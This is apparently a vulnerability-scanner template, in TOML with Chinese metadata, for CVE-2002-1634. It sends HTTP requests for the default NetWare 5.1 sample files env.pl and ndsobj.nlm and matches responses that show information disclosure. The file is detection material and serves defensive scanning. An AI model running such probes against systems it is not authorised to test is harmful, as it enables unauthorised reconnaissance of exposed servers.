[info]
author = "ave"
description = "通过 HTTP 请求检测 Novell NetWare 5.1 默认安装的示例应用程序（env.pl、ndsobj.nlm 等）是否可被远程未授权访问，验证信息泄露漏洞"
id = "POC-AVE-2002-0646"
name = "Novell NetWare 5.1 示例应用程序信息泄露 PoC"
severity = "medium"
tags = ["ave-2002-0646"]
vuln_id = [
    "CVE-2002-1634",
    "AVE-2002-0646",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/env.pl"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "CONTENT_LENGTH",
    "REMOTE_ADDR",
    "SERVER_SOFTWARE",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ndsobj.nlm"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
